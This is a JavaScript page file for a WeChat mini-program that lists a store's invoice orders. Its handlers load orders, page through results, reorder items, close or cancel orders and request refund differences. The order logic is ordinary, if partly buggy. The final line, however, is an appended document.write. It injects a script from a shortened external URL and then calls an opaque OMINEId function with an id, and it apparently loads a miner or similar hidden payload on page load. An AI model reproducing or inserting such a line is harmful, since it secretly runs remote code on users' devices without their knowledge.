var t = getApp(),
  a = t.requirejs("core"),
  e = t.requirejs("biz/order"),
  $=t.requirejs("jquery");
Page({
  data: {
    icons: t.requirejs("icons"),
    status: "all",
    list: [{ ordersn: "AB4558552222", statusstr: "待付款", order_goods: [ { thumb: "urlTest", title: "ME6211C33M5G ", optiontitle: "盘装", price: "0.56", pnum: "20" ,total:"11.2" }], price: "0.66", id: "10", cancancel: "true", canpay: "true", canverify: "10", candelete: "true", cancomment2: "true", cancomment: "true", cancomplete: "true", canrefund: "true", refundtext: "just do it", hasexpress: "true", canrestore: "true" }],
    pages: 1,
    code: false,
    show:"",
    loaded:false,
    cancel: e.cancelArray,
    cancelindex: 0,
    buttonText:"v",
    onshowData:false
  },
  onLoad: function (a) {
   
  },
  onShow:function(){
    this.get_list({ is_invoice: '1', invoice_status: '0', page: 1, pageSize: 10 });
  },
  get_list: function (addObject) {
    //我的代开发票订单
    var _this = this;
    wx.showLoading({
      title: '加载中'
    });
    var datas = {};
    if (addObject) {
      datas = $.extend({
        session_token: t.globalData.session_token,      
      }, addObject);
    } else {
      datas = {
        session_token: t.globalData.session_token,
        show_data:"orderDetail"
      };
    };
    wx.request({
      url: t.globalData.daxin + "/order/orderList",
      data: datas,
      method: "POST",
      success: function (res) {
        //console.log(res);
        wx.stopPullDownRefresh();
        wx.hideLoading();
        _this.setData({
          onshowData: true
        });
        if (!res.data.data.list){
          var datas={}
          if (addObject.page==1){
            datas={
              empty:true,
              show: true,
              loading:false,
              loaded:false,
              list:[]
            };
          }else{
            datas = {
              empty: false,
              show: true,
              pages:100,
              loading: false,
              loaded: true,
            };
          };
          _this.setData(datas);
            return;
        };
        if (res.data.statusCode >= 0 && res.data.data.list) {
          var lists = res.data.data.list;
          if (res.data.data.list.length == 0)
            {
              _this.setData({
              empty:true,
              show: true
            });
            return;
          };
          $.each(lists, function (index, value) {
            value.statusstr = t.getOrderStatus(value).indexOf("(") > 0 ? t.getOrderStatus(value).split("(")[0] : t.getOrderStatus(value);   
            if (t.getOrderStatus(value).indexOf("(") > 0) { value.ps="true"};
            if (value.order_goods){
              $.each(value.order_goods,function(ind,val){
                val.total = (val.p_price_true * val.p_num).toFixed(3);
                val.thumb = val.img ? t.globalData.daxinImg + val.img :"";
              });
            };
          });
          var setdatas = {
            list: lists,
            show: true,
            loaded: false,
            loading:true
          };
          if (addObject.page==1 && lists.length<10){
            setdatas.loaded =true;
            setdatas.loading  = false;
          }
          _this.setData(setdatas);
        } else {
          if (res.data.statusCode == "-400"){
            _this.setData({
              empty: true,
              show:true,
              list:[]
            });
          }else{
            wx.showModal({
              title: '错误提示',
              content: res.data.msg + ',数据获取失败',
              showCancel: false,
              success: function () {
                if (res.confirm) {

                }
              }
            })
          }
        }

      }
    })
  },
  onPullDownRefresh:function(){
     //下拉刷新
    this.setData({
      pages: 1,
      empty: false,
      loading: true,
      loaded:false
    });
    this.get_list({ is_invoice: '1', invoice_status: '0',page:1,pageSize:10 },function(){
        wx.stopPullDownRefresh();
      });
  },
  onReachBottom: function () {
    var pge = this.data.pages;
    pge++;
    if (pge >= 100) { return };
    if (!this.data.empty) {
      this.get_list({ is_invoice: '1', invoice_status: '0', page: pge, pageSize: 10 });
      this.setData({
        pages: pge
      });
    } 
    //this.data.loaded || this.data.list.length == this.data.total || this.get_list()
  },
  handle: function (t) {
    var e = this,
      s = a.pdata(t).type;
    switch (s) {
      case 'agianBuy': 
      //再次购买
        var data = a.pdata(t).data;
        $.each(data,function(ind,val){
          val.pid=val.p_id;
          val.num = val.p_num;
        })
        //console.log(data);
        e.addCart(data,function(){
          wx.switchTab({
            url: '/pages/member/cart/index',
        });     
        });break;
      case 'knot': 
        var order_sn=a.pdata(t).id;
        e.knot(order_sn,function(){
          e.get_list();
        }); break;
      case 'difference': e.difference({ order_sn:a.pdata(t).order_sn}); break;
      case '2': obj = { ship_status: 2 }; break;
      case '3': obj = { order_status: 3 }; break;
      case '4': obj = { is_retreat: 1 }; break;
      case '5': obj = { is_comment: 1 }; break;
      default: break;
    };
  },
  addCart: function (data,fn) {
    //再次购买
    var _this = this;
    wx.request({
      url: t.globalData.daxin + "/basket/basketAction",
      data: {
        session_token: t.globalData.session_token,
        productList: data,
      },
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.msg == "success") {
          if (fn)fn();
          //_this.get_list();
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg + ',加入购物车失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  knot: function (data, fn) {
    //结单
    var _this = this;
    wx.request({
      url: t.globalData.daxin + "/order/knotOrder",
      data: {
        session_token: t.globalData.session_token,
        order_sn: data,
      },
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.msg == "结单提交成功") {
          if (fn) { fn(); };
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg ,
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  finish: function () {
    return;
    this.setData({
      code: false
    })
  },
  cancel: function (event) {
    //取消订单
    var order_sn = a.data(event).order_sn;
    var _this = this;
    wx.request({
      url: t.globalData.daxin + "/order/cancelOrder",
      data: {
        session_token: t.globalData.session_token,
        order_sn: order_sn,
      },
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.msg == "取消成功") {
          if (fn) { fn(); };
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg,
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  difference:function(addObj){
    //返差额
    var _this = this;
    var data = {
      session_token: t.globalData.session_token,
      customer_account_type : 2,
      customer_account: '000',
      notify_mobile : '000',
      account_name: '000'
      };
    wx.request({
      url: t.globalData.daxin + "/order/knotOrderMoney",
      data: $.extend(data,addObj),
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.msg == "结单提交成功") {
          if (fn) { fn(); };
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg,
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  onShareAppMessage: function () {
    return a.onShareAppMessage()
  },
  moreHandle:function(event){
    var indd= a.pdata(event).self;
    var status = indd;
    if (this.data['buttonStatus'] == indd) { status = "-1";}; 
    this.setData({
      'buttonStatus': status,
      isTurn: status
    });
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
